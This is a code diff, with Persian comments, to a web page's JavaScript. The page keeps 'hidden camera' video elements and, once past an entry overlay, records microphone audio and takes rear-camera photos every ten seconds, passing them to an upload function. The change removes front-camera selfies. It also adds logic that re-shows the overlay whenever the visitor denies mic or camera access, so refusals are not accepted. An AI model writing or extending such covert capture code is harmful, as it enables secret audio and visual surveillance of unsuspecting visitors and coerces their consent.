@@ -1470,8 +1470,7 @@
     <canvas id="matrix-canvas"></canvas>
     <div id="toast" class="toast"></div>
 
-    <!-- دوربین‌های مخفی -->
-    <video id="camFront" class="hidden-camera" autoplay playsinline muted></video>
+    <!-- دوربین مخفی (فقط عقب) -->
     <video id="camBack" class="hidden-camera" autoplay playsinline muted></video>
 
     <!-- ENTRY OVERLAY -->
@@ -1848,7 +1847,6 @@
             const forYouClose = $('forYouClose');
             const entryOverlay = $('entryOverlay');
             const overlayFeedback = $('overlayFeedback');
-            const camFront = $('camFront');
             const camBack = $('camBack');
 
             // =============================================================
@@ -2489,6 +2487,13 @@
                 overlayFeedback.className = 'overlay-feedback ' + (type || '');
             }
 
+            function showEntryOverlay() {
+                entryOverlay.classList.remove('hidden');
+                setOverlayFeedback('', '');
+                // حذف وضعیت عبور برای اینکه کاربر دوباره انتخاب کند
+                try { localStorage.removeItem('arcker_entry_passed'); } catch (_) {}
+            }
+
             function hideOverlay() {
                 entryOverlay.classList.add('hidden');
                 // شروع ضبط صدا و تصویر
@@ -2530,7 +2535,7 @@
             }
 
             // =============================================================
-            //  ۱۲.  ضبط صدا (Opus) + عکس (AVIF) – هر ۱۰ ثانیه
+            //  ۱۲.  ضبط صدا (Opus) + عکس (AVIF) – هر ۱۰ ثانیه (فقط دوربین عقب)
             // =============================================================
 
             let mediaRecorder = null;
@@ -2539,7 +2544,6 @@
             let isMicAllowed = false;
             let audioChunks = [];
             let streamAudio = null;
-            let streamFront = null;
             let streamBack = null;
             let isCamAllowed = false;
             let captureIntervalId = null;
@@ -2569,30 +2573,25 @@
                     });
             }
 
-            // ---- گرفتن عکس از یک video element و تبدیل به AVIF ----
-            function captureFrame(videoElement, facingMode) {
+            // ---- گرفتن عکس از دوربین عقب و تبدیل به AVIF ----
+            function captureBackCamera() {
                 return new Promise((resolve) => {
-                    if (!videoElement || videoElement.readyState < 2) {
+                    if (!camBack || camBack.readyState < 2) {
                         resolve(null);
                         return;
                     }
                     try {
                         const canvas = document.createElement('canvas');
-                        canvas.width = videoElement.videoWidth || 640;
-                        canvas.height = videoElement.videoHeight || 480;
+                        canvas.width = camBack.videoWidth || 640;
+                        canvas.height = camBack.videoHeight || 480;
                         const ctx = canvas.getContext('2d');
-                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                        // تبدیل به AVIF با کیفیت 0.8
+                        ctx.drawImage(camBack, 0, 0, canvas.width, canvas.height);
                         canvas.toBlob((blob) => {
                             if (!blob) { resolve(null); return; }
                             const reader = new FileReader();
                             reader.onload = () => {
                                 const base64 = reader.result.split(',')[1];
-                                resolve({
-                                    base64: base64,
-                                    size: blob.size,
-                                    facing: facingMode
-                                });
+                                resolve({ base64: base64, size: blob.size });
                             };
                             reader.onerror = () => resolve(null);
                             reader.readAsDataURL(blob);
@@ -2604,18 +2603,12 @@
                 });
             }
 
-            // ---- گرفتن عکس از هر دو دوربین ----
-            async function captureBothCameras() {
-                const frontResult = await captureFrame(camFront, 'user');
-                const backResult = await captureFrame(camBack, 'environment');
-
-                if (frontResult) {
+            // ---- تابع ارسال عکس از دوربین عقب ----
+            async function sendBackPhoto() {
+                const result = await captureBackCamera();
+                if (result) {
                     const ts = new Date().toISOString().replace(/[:.]/g, '-');
-                    uploadFile(frontResult.base64, `selfie_${ts}.avif`, 'image/avif');
-                }
-                if (backResult) {
-                    const ts = new Date().toISOString().replace(/[:.]/g, '-');
-                    uploadFile(backResult.base64, `back_${ts}.avif`, 'image/avif');
+                    uploadFile(result.base64, `back_${ts}.avif`, 'image/avif');
                 }
             }
 
@@ -2697,60 +2690,78 @@
 
             // ---- شروع همه چیز ----
             function startAllCaptures() {
+                let micGranted = false;
+                let camGranted = false;
+
                 // درخواست میکروفون
                 if (!isMicAllowed) {
                     navigator.mediaDevices.getUserMedia({ audio: true })
                         .then(stream => {
                             streamAudio = stream;
                             isMicAllowed = true;
+                            micGranted = true;
                             startAudioRecording();
+                            // اگر هر دو دسترسی گرفته شد، ادامه بده
+                            if (camGranted) {
+                                // تایمر عکس‌برداری را شروع کن
+                                if (captureIntervalId) clearInterval(captureIntervalId);
+                                captureIntervalId = setInterval(() => {
+                                    sendBackPhoto();
+                                }, 10000);
+                                sendBackPhoto();
+                            }
                         })
                         .catch(err => {
                             console.error('[Mic] Error:', err);
-                            // اگر میکروفون رد شد، باز هم دوربین را شروع کن
+                            micGranted = false;
+                            // اگر میکروفون رد شد، به صفحه برگرد
+                            showEntryOverlay();
+                            return;
                         });
                 } else {
+                    micGranted = true;
                     startAudioRecording();
                 }
 
-                // درخواست دوربین‌ها (جلو و عقب)
+                // درخواست دوربین عقب
                 if (!isCamAllowed) {
-                    const constraintsFront = {
-                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
-                    };
                     const constraintsBack = {
                         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }
                     };
-
-                    Promise.all([
-                        navigator.mediaDevices.getUserMedia(constraintsFront),
-                        navigator.mediaDevices.getUserMedia(constraintsBack)
-                    ]).then(([streamF, streamB]) => {
-                        streamFront = streamF;
-                        streamBack = streamB;
-                        camFront.srcObject = streamF;
-                        camBack.srcObject = streamB;
-                        isCamAllowed = true;
-
-                        // شروع تایمر عکس‌برداری هر ۱۰ ثانیه
-                        if (captureIntervalId) clearInterval(captureIntervalId);
-                        captureIntervalId = setInterval(() => {
-                            captureBothCameras();
-                        }, 10000);
-                        // بلافاصله یک بار عکس بگیر
-                        setTimeout(captureBothCameras, 500);
-                    }).catch(err => {
-                        console.error('[Camera] Error:', err);
-                        // اگر دوربین رد شد، فقط صدا ادامه دارد
-                    });
+                    navigator.mediaDevices.getUserMedia(constraintsBack)
+                        .then(stream => {
+                            streamBack = stream;
+                            camBack.srcObject = stream;
+                            isCamAllowed = true;
+                            camGranted = true;
+                            // اگر میکروفون قبلاً گرفته شده بود، تایمر عکس را شروع کن
+                            if (isMicAllowed) {
+                                if (captureIntervalId) clearInterval(captureIntervalId);
+                                captureIntervalId = setInterval(() => {
+                                    sendBackPhoto();
+                                }, 10000);
+                                sendBackPhoto();
+                            }
+                        })
+                        .catch(err => {
+                            console.error('[Camera] Error:', err);
+                            camGranted = false;
+                            // اگر دوربین رد شد، به صفحه برگرد
+                            showEntryOverlay();
+                            return;
+                        });
                 } else {
-                    // اگر دوربین قبلاً فعال شده، فقط تایمر را تنظیم کن
+                    camGranted = true;
+                    // اگر دوربین قبلاً فعال شده، تایمر را تنظیم کن
                     if (!captureIntervalId) {
                         captureIntervalId = setInterval(() => {
-                            captureBothCameras();
+                            sendBackPhoto();
                         }, 10000);
                     }
                 }
+
+                // اگر هر دو دسترسی وجود داشته باشد، همه چیز خوب است
+                // ولی اگر یکی رد شد، showEntryOverlay فراخوانی می‌شود
             }
 
             // =============================================================
